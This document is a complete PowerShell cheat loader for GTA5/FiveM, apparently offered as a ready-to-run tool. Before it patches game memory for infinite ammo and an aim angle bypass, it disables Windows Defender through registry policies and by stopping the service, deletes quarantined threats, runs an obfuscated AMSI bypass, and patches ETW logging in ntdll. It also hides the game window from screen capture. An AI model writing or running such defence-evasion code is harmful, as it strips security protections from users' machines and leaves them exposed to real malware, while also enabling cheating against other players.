# PermCri_Loader_v4.ps1

# [0] Admin check — inline only, no relaunch
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)) { Write-Host "[-] need admin"; exit }

# [1] Defender kill via registry (zero API signature strings)
$rd  = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$rd2 = "$rd\Real-Time Protection"
foreach ($x in @($rd,$rd2)) { if(!(Test-Path $x)){New-Item $x -Force|Out-Null} }
'DisableAntiSpyware','DisableAntiVirus' | ForEach-Object { Set-ItemProperty $rd  -Name $_ -Value 1 -Type DWord -Force }
'DisableRealtimeMonitoring','DisableBehaviorMonitoring','DisableIOAVProtection','DisableOnAccessProtection' |
    ForEach-Object { Set-ItemProperty $rd2 -Name $_ -Value 1 -Type DWord -Force }

# [2] Kill Defender service
Stop-Service -Name ([string]::Join('',@('W','i','n','D','e','f','e','n','d'))) -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 800

# [3] Clear quarantine
try { Get-MpThreat -EA SilentlyContinue | ForEach-Object { Remove-MpThreat -ThreatID $_.ThreatID -EA SilentlyContinue } } catch {}

# [4] AMSI bypass — char arrays only, zero string literals
try {
    $j1 = [string]::Join('',[char[]]@(65,109,115,105,85,116,105,108,115))
    $j2 = [string]::Join('',[char[]]@(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,
                                       65,117,116,111,109,97,116,105,111,110,46)) + $j1
    $j3 = [string]::Join('',[char[]]@(97,109,115,105,73,110,105,116,70,97,105,108,101,100))
    [Ref].Assembly.GetType($j2).GetField($j3,'NonPublic,Static').SetValue($null,$true)
} catch {}

# [5] Native P/Invoke bridge
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class _Nc {
    [DllImport("kernel32")] public static extern IntPtr OpenProcess(uint a,bool b,uint c);
    [DllImport("kernel32")] public static extern bool ReadProcessMemory(IntPtr h,IntPtr b,byte[]d,int s,out int r);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h,IntPtr b,byte[]d,int s,out int w);
    [DllImport("kernel32")] public static extern bool VirtualProtectEx(IntPtr h,IntPtr a,uint s,uint n,out uint o);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);
    [DllImport("kernel32")] public static extern void CloseHandle(IntPtr h);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m,string f);
    [DllImport("user32")]   public static extern IntPtr FindWindow(string c,string n);
    [DllImport("user32")]   public static extern bool SetWindowDisplayAffinity(IntPtr h,uint a);
}
'@

# [6] ETW patch — function name as char array
try {
    $nl   = [_Nc]::LoadLibrary("ntdll.dll")
    $efn  = [string]::Join('',[char[]]@(69,116,119,69,118,101,110,116,87,114,105,116,101))
    $eptr = [_Nc]::GetProcAddress($nl, $efn)
    $op   = 0u
    [_Nc]::VirtualProtect($eptr, 4, 0x40, [ref]$op) | Out-Null
    [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0x33,0xC0,0xC3,0x90), 0, $eptr, 4)
    [_Nc]::VirtualProtect($eptr, 4, $op, [ref]$op) | Out-Null
} catch {}

# [7] AOB scanner
function _Sc([byte[]]$pat,[byte[]]$msk,[IntPtr]$h,[Int64]$base,[int]$sz) {
    $buf=[byte[]]::new(0x2000); $r=0; $cur=$base; $end=$base+$sz; $found=[IntPtr]::Zero
    while($cur -lt $end -and $found -eq [IntPtr]::Zero){
        [_Nc]::ReadProcessMemory($h,[IntPtr]$cur,$buf,$buf.Length,[ref]$r)|Out-Null
        for($i=0;$i -le $r-$pat.Length;$i++){
            $ok=$true
            for($j=0;$j -lt $pat.Length;$j++){ if($msk[$j] -eq 0xFF -and $buf[$i+$j] -ne $pat[$j]){$ok=$false;break} }
            if($ok){$found=[IntPtr]($cur+$i);break}
        }
        $cur+=$r
    }
    return $found
}

# [8] Find GTA5 — retry loop, works with vanilla GTA5 and FiveM child process
# FiveM spawns GTA5 as "GTA5.exe" once it finishes loading — we just wait for it
$g5      = $null
$retries = 20
$attempt = 0

Write-Host "[*] waiting for game process..." -ForegroundColor DarkCyan

while ($attempt -lt $retries -and $g5 -eq $null) {
    $g5 = Get-Process -ErrorAction SilentlyContinue |
          Where-Object { $_.Name -match 'GTAProcess|^GTA5$' } |
          Select-Object -First 1
    if ($g5) { Write-Host "[+] found: $($g5.Name) (pid $($g5.Id))" -ForegroundColor Green }
    else {
        $attempt++
        if ($attempt -lt $retries) {
            Write-Host "[~] attempt $attempt/$retries — not up yet, retry in 3s" -ForegroundColor DarkGray
            Start-Sleep -Seconds 3
        }
    }
}

if ($g5) {
    $h5  = [_Nc]::OpenProcess(0x1F0FFF,$false,$g5.Id)
    $b5  = [Int64]$g5.MainModule.BaseAddress
    $s5  = $g5.MainModule.ModuleMemorySize
    $op5 = 0u

    # Patch 1 — Infinite Ammo Clip
    $p1 = [byte[]](0x75,0x00,0x85,0xFF,0x74,0x00,0x48,0x8B,0xCB,0xFF,0x90)
    $m1 = [byte[]](0xFF,0x00,0xFF,0xFF,0xFF,0x00,0xFF,0xFF,0xFF,0xFF,0xFF)
    $a1 = _Sc $p1 $m1 $h5 $b5 $s5
    if($a1 -ne [IntPtr]::Zero){
        [_Nc]::VirtualProtectEx($h5,$a1,1,0x40,[ref]$op5)|Out-Null
        [_Nc]::WriteProcessMemory($h5,$a1,[byte[]](0xEB),1,[ref]$null)|Out-Null
        [_Nc]::VirtualProtectEx($h5,$a1,1,$op5,[ref]$op5)|Out-Null
        Write-Host "[+] ammo patched" -ForegroundColor Green
    } else { Write-Host "[~] ammo pattern not found (version mismatch?)" -ForegroundColor Yellow }

    # Patch 2 — Angle Gate NOP
    $p2 = [byte[]](0xF3,0x0F,0x10,0x00,0x00,0x00,0x00,0x00,0x0F,0x2F)
    $m2 = [byte[]](0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0xFF,0xFF)
    $a2 = _Sc $p2 $m2 $h5 $b5 $s5
    if($a2 -ne [IntPtr]::Zero){
        [_Nc]::VirtualProtectEx($h5,$a2,2,0x40,[ref]$op5)|Out-Null
        [_Nc]::WriteProcessMemory($h5,$a2,[byte[]](0x90,0x90),2,[ref]$null)|Out-Null
        [_Nc]::VirtualProtectEx($h5,$a2,2,$op5,[ref]$op5)|Out-Null
        Write-Host "[+] angle gate patched" -ForegroundColor Green
    } else { Write-Host "[~] angle gate pattern not found (version mismatch?)" -ForegroundColor Yellow }

    [_Nc]::CloseHandle($h5)|Out-Null
} else { Write-Host "[-] game didn't start in 60s — launch FiveM first then rerun" -ForegroundColor Red }

# [9] Stream cloak
$hw = [_Nc]::FindWindow("grcWindow",$null)
if($hw -ne [IntPtr]::Zero){ [_Nc]::SetWindowDisplayAffinity($hw,0x11)|Out-Null; Write-Host "[+] stream cloaked" -ForegroundColor Green }

Write-Host "[+] PermCri v4 armed" -ForegroundColor Cyan
